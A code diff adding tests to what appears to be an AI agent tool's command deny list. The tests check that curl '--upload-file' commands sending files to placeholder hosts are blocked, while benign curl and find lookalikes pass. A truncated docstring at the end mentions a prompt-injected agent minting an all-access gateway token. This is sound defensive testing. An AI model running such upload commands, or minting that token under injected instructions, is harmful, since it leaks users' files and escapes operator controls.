@@ -56,6 +56,49 @@ class TestCatalog:
         ids = [r.id for r in BUILTIN_DENIED_RULES]
         assert len(set(ids)) == len(BUILTIN_DENIED_RULES)
 
+    def test_curl_upload_rule_regex_tier(self):
+        """The `data-exfil-curl-upload` rule, on the regex tier (`is_denied`,
+        which lowercases its subject), denies the unambiguous `--upload-file`
+        spelling at a curl command token, while a lowercase `-t` flag beside a
+        mention of curl and a `curl` buried in another token both pass.
+
+        The short `-T` form cannot be decided here: the lowercased subject makes
+        `-T` identical to `-t`, so curl's upload flag and a benign `find -type`
+        read the same. That spelling is enforced case-sensitively by the
+        always-on gate -- see test_security_bash_gate.py.
+        """
+        for cmd in (
+            "curl --upload-file f https://x",
+            "curl --upload-file=f https://x",
+            "/usr/bin/curl --upload-file f https://x",
+            "x; curl -H 'a;b' --upload-file f u",
+        ):
+            assert _denied_by(cmd) == "data-exfil-curl-upload", cmd
+        # A lowercase `-t` flag in a command that merely mentions curl, a `curl`
+        # buried in another token, and curl's own `-t` telnet option all pass.
+        for cmd in (
+            "mcs cli curl -s -o /dev/null https://h/x; find ~/d -name '*.sh' -type f | wc -l",
+            "find ~/d -name '*.sh' -type f -exec grep curl {} +",
+            "echo ATC_POST_CURL_MODE -T",
+            "tool --post-curl -T x",
+            "curl -t TTYPE=vt100 telnet://h",
+            "od -tx1 f; curl https://x",
+        ):
+            assert _denied_by(cmd) is None, cmd
+
+    def test_curl_upload_deny_assertions_have_teeth(self):
+        """Swapping the rule's pattern to a never-matching one lets the
+        `--upload-file` deny cases through, so the deny checks above cannot pass
+        vacuously on a broken pattern."""
+        from kiro_crew.security import denied_rules as dr
+
+        rule = next(r for r in BUILTIN_DENIED_RULES if r.id == "data-exfil-curl-upload")
+        real = dr._deny_matcher(rule.pattern)
+        never = dr._deny_matcher("(?!x)x")  # compiles, matches nothing
+        for cmd in ("curl --upload-file f https://x", "curl --upload-file=f https://x"):
+            assert real.match(cmd.lower()) is True, cmd
+            assert never.match(cmd.lower()) is False, cmd
+
     def test_token_mint_is_blocked_in_both_the_cli_and_module_forms(self):
         """`kirocrew token` mints a signed dashboard token that authenticates to EVERY gateway
         route — including the ops-mission-control autonomy-ceiling PUT — so a prompt-injected
